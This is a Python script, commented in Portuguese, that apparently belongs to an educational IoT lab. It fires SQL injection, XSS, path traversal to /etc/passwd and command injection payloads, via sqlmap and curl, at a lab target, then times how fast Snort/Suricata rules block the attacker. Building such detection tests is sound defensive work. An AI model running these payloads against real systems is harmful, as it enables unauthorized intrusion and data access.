#!/usr/bin/env python3
"""
Script para executar ataques automatizados no Linux atacante.

Executa os 5 tipos de ataques configuráveis, registra timestamps e monitora
perda de acesso à internet. Envia dados para a API ou salva em JSON.

Uso:
    python attack_runner.py --target http://192.168.59.103 --api-url http://api-iot-edu/api
    python attack_runner.py --target http://192.168.59.103 --output attack_log.json

Métricas coletadas:
- attack_start: Início do ataque
- access_lost: Momento em que o atacante perde acesso (ping falha)
"""
import argparse
import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    import requests
except ImportError:
    requests = None

# Configuração dos 5 tipos de ataques (ajuste conforme suas regras Snort/Suricata)
ATTACKS = [
    {
        "id": "sql_comment",
        "name": "SQL Comment Injection",
        "cmd": ["sqlmap", "-u", "{target}?id=1", "--batch", "--level=3", "--risk=2"],
        "fallback": "curl -s '{target}?id=1%27%20OR%201=1--' > /dev/null",
    },
    {
        "id": "sql_union",
        "name": "SQL Union Injection",
        "cmd": ["sqlmap", "-u", "{target}?id=1", "--batch", "--technique=U"],
        "fallback": "curl -s '{target}?id=1%20UNION%20SELECT%20NULL--' > /dev/null",
    },
    {
        "id": "xss",
        "name": "Cross-Site Scripting",
        "cmd": None,
        "fallback": "curl -s '{target}?q=<script>alert(1)</script>' > /dev/null",
    },
    {
        "id": "path_traversal",
        "name": "Path Traversal",
        "cmd": None,
        "fallback": "curl -s '{target}/../../../etc/passwd' > /dev/null",
    },
    {
        "id": "command_injection",
        "name": "Command Injection",
        "cmd": None,
        "fallback": "curl -s '{target}?cmd=;id' > /dev/null",
    },
]


def get_attacker_ip() -> str:
    """Obtém o IP do atacante (interface principal)."""
    try:
        result = subprocess.run(
            ["hostname", "-I"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode == 0 and result.stdout:
            return result.stdout.strip().split()[0]
    except Exception:
        pass
    return ""


def run_attack(attack: dict, target: str, timeout: int = 30) -> bool:
    """Executa um ataque e retorna True se completou (ou falhou por timeout)."""
    cmd = attack.get("cmd")
    fallback = attack.get("fallback", "").format(target=target)

    if cmd:
        cmd = [c.replace("{target}", target) for c in cmd]
        try:
            subprocess.run(cmd, timeout=timeout, capture_output=True)
            return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass

    # Fallback com curl
    try:
        subprocess.run(fallback, shell=True, timeout=timeout, capture_output=True)
    except subprocess.TimeoutExpired:
        pass
    return True


def check_connectivity(ping_target: str = "8.8.8.8", count: int = 2) -> bool:
    """Verifica se há conectividade (ping). Retorna True se conseguiu pingar."""
    try:
        result = subprocess.run(
            ["ping", "-c", str(count), "-W", "2", ping_target],
            capture_output=True,
            timeout=10,
        )
        return result.returncode == 0
    except Exception:
        return False


def monitor_access_lost(ping_target: str = "8.8.8.8", poll_interval: float = 0.5, max_wait: float = 60) -> Optional[datetime]:
    """
    Monitora até o atacante perder acesso. Retorna timestamp da perda ou None.
    """
    start = time.time()
    while (time.time() - start) < max_wait:
        if not check_connectivity(ping_target):
            return datetime.now()
        time.sleep(poll_interval)
    return None


def send_to_api(api_url: str, data: dict, api_key: Optional[str] = None) -> bool:
    """Envia dados do ataque para a API."""
    if not requests:
        print("⚠️ requests não instalado. Use: pip install requests")
        return False
    url = f"{api_url.rstrip('/')}/api/test/attack-metrics"
    headers = {"Content-Type": "application/json"}
    if api_key:
        headers["X-API-Key"] = api_key
    try:
        r = requests.post(url, json=data, headers=headers, timeout=10)
        return r.status_code in (200, 201)
    except Exception as e:
        print(f"Erro ao enviar para API: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="Executor de ataques automatizados")
    parser.add_argument("--target", required=True, help="URL alvo (ex: http://192.168.59.103)")
    parser.add_argument("--api-url", help="URL da API para enviar métricas")
    parser.add_argument("--output", help="Arquivo JSON para salvar resultados")
    parser.add_argument("--ping-target", default="8.8.8.8", help="IP para testar conectividade")
    parser.add_argument("--attack-ids", nargs="+", help="IDs dos ataques a executar (default: todos)")
    parser.add_argument("--interval", type=float, default=5, help="Intervalo entre ataques (segundos)")
    parser.add_argument("--api-key", help="Chave API para autenticação")
    args = parser.parse_args()

    results = []
    target = args.target.rstrip("/")

    print("=" * 60)
    print("EXECUTOR DE ATAQUES AUTOMATIZADOS")
    print("=" * 60)
    print(f"Alvo: {target}")
    print(f"Ping para: {args.ping_target}")
    print()

    attacks_to_run = ATTACKS
    if args.attack_ids:
        attacks_to_run = [a for a in ATTACKS if a["id"] in args.attack_ids]

    for i, attack in enumerate(attacks_to_run, 1):
        print(f"\n[{i}/{len(attacks_to_run)}] Executando: {attack['name']}")

        # Garantir conectividade antes de iniciar
        if not check_connectivity(args.ping_target):
            print("  ⚠️ Sem conectividade antes do ataque. Aguardando...")
            for _ in range(20):
                time.sleep(1)
                if check_connectivity(args.ping_target):
                    break

        attack_start = datetime.now()
        print(f"  Início: {attack_start.isoformat()}")

        # Executar ataque em background para poder monitorar conectividade
        import threading
        attack_done = threading.Event()
        def do_attack():
            run_attack(attack, target)
            attack_done.set()
        t = threading.Thread(target=do_attack)
        t.start()

        # Monitorar perda de acesso
        access_lost_at = monitor_access_lost(args.ping_target)

        t.join(timeout=35)
        if t.is_alive():
            print("  Ataque em timeout (normal)")

        record = {
            "attack_id": attack["id"],
            "attack_name": attack["name"],
            "attack_start": attack_start.isoformat(),
            "access_lost": access_lost_at.isoformat() if access_lost_at else None,
            "target": target,
            "attacker_ip": get_attacker_ip(),
        }
        results.append(record)

        if access_lost_at:
            delta = (access_lost_at - attack_start).total_seconds()
            print(f"  Perda de acesso: {access_lost_at.isoformat()} (+{delta:.2f}s)")
        else:
            print("  Perda de acesso: não detectada no tempo limite")

        # Enviar para API
        if args.api_url:
            if send_to_api(args.api_url, record, args.api_key):
                print("  ✅ Enviado para API")
            else:
                print("  ❌ Falha ao enviar para API")

        if i < len(attacks_to_run):
            time.sleep(args.interval)

    # Salvar em arquivo
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump({"attacks": results, "collected_at": datetime.now().isoformat()}, f, indent=2)
        print(f"\n✅ Resultados salvos em {args.output}")

    print("\n" + "=" * 60)
    print("Concluído.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
